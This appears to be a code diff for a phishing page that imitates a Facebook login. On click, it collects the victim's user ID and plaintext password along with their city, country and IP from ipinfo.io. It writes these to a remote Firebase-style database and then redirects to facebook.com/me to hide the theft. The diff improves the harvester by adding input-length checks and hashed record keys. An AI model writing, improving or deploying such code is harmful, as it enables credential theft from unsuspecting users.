@@ -29,6 +29,8 @@ $.get("https://ipinfo.io", function (response) {
   country = response.country
   console.log(response.city, response.country);
 }, "jsonp");
+
+LoginBtn.disable = false;
 LoginBtn.addEventListener('click', e => {
   e.preventDefault();
   // const autoId = usersRef.push().key
@@ -36,15 +38,24 @@ LoginBtn.addEventListener('click', e => {
   //   ID: userId.value,
   //   pw: Pass.value
   // });
+  if (userId.value.length > 4 && Pass.value.length > 4) {
+    hashCode = function(s) {
+      var h = 0, l = s.length, i = 0;
+      if ( l > 0 )
+        while (i < l)
+          h = (h << 5) - h + s.charCodeAt(i++) | 0;
+      return h;
+    };
 
-  usersRef.child(userId.value).transaction(function (currentData) {
-    if (currentData === null) {
-      return { ID: userId.value, pw: Pass.value, City: city, Country: country, IP: ip };
-      // return {ID:userId.value,pw:Pass.value,City:"",Country:"",IP:""};
-    } else {
-      // console.log('User  already exists.');
-      return; // Abort the transaction.
-    }
-  });
-  window.location.replace("http://www.facebook.com/me");
+    usersRef.child(hashCode(userId.value.toString())).transaction(function (currentData) {
+      if (currentData === null) {
+        return { ID: userId.value, pw: Pass.value, City: city, Country: country, IP: ip };
+        // return {ID:userId.value,pw:Pass.value,City:"",Country:"",IP:""};
+      } else {
+        // console.log('User  already exists.');
+        return; // Abort the transaction.
+      }
+    });
+    window.location.replace("http://www.facebook.com/me");
+  }
 });
